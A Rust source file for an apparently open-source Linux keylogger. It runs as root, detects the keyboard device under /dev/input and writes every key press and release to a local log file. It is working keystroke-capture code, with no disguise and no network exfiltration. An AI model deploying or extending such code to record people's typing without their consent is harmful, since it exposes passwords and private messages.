extern crate getopts;
extern crate env_logger;
extern crate libc;

#[macro_use]
extern crate log;

mod input;

use input::{is_key_event, is_key_press, is_key_release, get_key_text, InputEvent};

use std::process::{exit, Command};
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::{env, mem};

use getopts::Options;

const VERSION: &'static str = env!("CARGO_PKG_VERSION");

#[derive(Debug)]
struct Config {
    device_file: String,
    log_file: String
}

impl Config {
    fn new(device_file: String, log_file: String) -> Self {
        Config { device_file: device_file, log_file: log_file }
    }
}

fn main() {
    root_check();

    env_logger::init().unwrap();

    let config = parse_args();
    debug!("Config: {:?}", config);

    let mut log_file = OpenOptions::new().create(true).write(true).append(true).open(config.log_file)
        .unwrap_or_else(|e| panic!("{}", e));
    let mut device_file = File::open(&config.device_file).unwrap_or_else(|e| panic!("{}", e));

    // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
    let mut buf: [u8; 24] = unsafe { mem::zeroed() };

    let mut last_added_index = 0;
    let mut holding_down = Vec::new();

    loop {
        let num_bytes = device_file.read(&mut buf).unwrap_or_else(|e| panic!("{}", e));
        if num_bytes != mem::size_of::<InputEvent>() {
            panic!("Error while reading from device file");
        }
        let event: InputEvent = unsafe { mem::transmute(buf) };
        if is_key_event(event.type_) {
            if is_key_press(event.value) {
                if last_added_index + 1 == holding_down.len() {
					// Log the press event for the previously pressed key.
                    print_key(*holding_down.last().unwrap(), '+', &mut log_file);
                }
                last_added_index = holding_down.len();
                holding_down.push(event.code);
            } else if is_key_release(event.value) {
                if let Some(position) = holding_down.iter()
                    .position(|x| *x == event.code) {
                        if position + 1 == holding_down.len() {
							// Of all the keys we're holding, the one that is
							// being released now is the one that was pressed
							// last.
                            if last_added_index > position {
								// But another key has been pressed and released
								// in the meantime.
                                print_key(event.code, '-', &mut log_file);
                            } else {
								// No other key has been pressed and released
								// in the meantime, so we log the event as a
								// single 'press and release' event.
                                print_key(event.code, '±', &mut log_file);
                            }
                            holding_down.pop();
                        } else {
							if last_added_index + 1 == holding_down.len() {
								// Another key was pressed after this one, but the
								// newest key has not yet been logged. So lets
								// log the press event for that key right before
								// logging the release event for this key.
								print_key(*holding_down.last().unwrap(), '+', &mut log_file);
							}
                            print_key(event.code, '-', &mut log_file);
                            holding_down.remove(position);
                        }
                    }
            }
        }
    }
}

fn print_key(code: u16, sign: char, file: &mut File) {
    let text = get_key_text(code);
    write!(file, "{}{}\n", sign, text).unwrap_or_else(|e| panic!("{}", e));
}

fn root_check() {
    let euid = unsafe { libc::geteuid() };
    if euid != 0 {
        panic!("Must run as root user");
    }
}

fn parse_args() -> Config {
    fn print_usage(program: &str, opts: Options) {
        let brief = format!("Usage: {} [options]", program);
        println!("{}", opts.usage(&brief));
    }

    let args: Vec<_> = env::args().collect();

    let mut opts = Options::new();
    opts.optflag("h", "help", "prints this help message");
    opts.optflag("v", "version", "prints the version");
    opts.optopt("d", "device", "specify the device file", "DEVICE");
    opts.optopt("f", "file", "specify the file to log to", "FILE");

    let matches = opts.parse(&args[1..]).unwrap_or_else(|e| panic!("{}", e));
    if matches.opt_present("h") {
        print_usage(&args[0], opts);
        exit(0);
    }

    if matches.opt_present("v") {
        println!("{}", VERSION);
        exit(0);
    }

    let device_file = matches.opt_str("d").unwrap_or_else(|| get_default_device());
    let log_file = matches.opt_str("f").unwrap_or("keys.log".to_owned());

    Config::new(device_file, log_file)
}

fn get_default_device() -> String {
    let mut filenames = get_keyboard_device_filenames();
    debug!("Detected devices: {:?}", filenames);

    if filenames.len() == 1 {
        filenames.swap_remove(0)
    } else {
        panic!("The following keyboard devices were detected: {:?}. Please select one using \
                the `-d` flag", filenames);
    }
}

// Detects and returns the name of the keyboard device file. This function uses
// the fact that all device information is shown in /proc/bus/input/devices and
// the keyboard device file should always have an EV of 120013
fn get_keyboard_device_filenames() -> Vec<String> {
    let mut command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices".to_string();
    command_str.push_str("| grep -B1 120013");
    command_str.push_str("| grep -Eo event[0-9]+");

    let res = Command::new("sh").arg("-c").arg(command_str).output().unwrap_or_else(|e| {
        panic!("{}", e);
    });
    let res_str = std::str::from_utf8(&res.stdout).unwrap();

    let mut filenames = Vec::new();
    for file in res_str.trim().split('\n') {
        let mut filename = "/dev/input/".to_string();
        filename.push_str(file);
        filenames.push(filename);
    }
    filenames
}

